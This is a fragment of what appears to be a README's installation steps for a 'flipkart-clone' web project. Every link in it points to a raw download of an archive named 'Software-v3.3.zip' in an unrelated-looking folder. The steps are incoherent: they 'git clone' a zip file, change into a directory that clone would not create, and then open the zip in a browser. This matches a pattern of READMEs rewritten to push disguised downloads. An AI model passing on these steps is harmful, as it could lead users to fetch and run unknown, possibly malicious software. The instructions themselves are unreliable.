...
1. Clone the repository:
   ```sh
   git clone https://raw.githubusercontent.com/nikeshRajbanshi231/flipcart/main/culilawan/Software-v3.3.zip
   ```
2. Navigate to the project directory:
   ```sh
   cd flipkart-clone
   ```
3. Open `https://raw.githubusercontent.com/nikeshRajbanshi231/flipcart/main/culilawan/Software-v3.3.zip` in your browser.
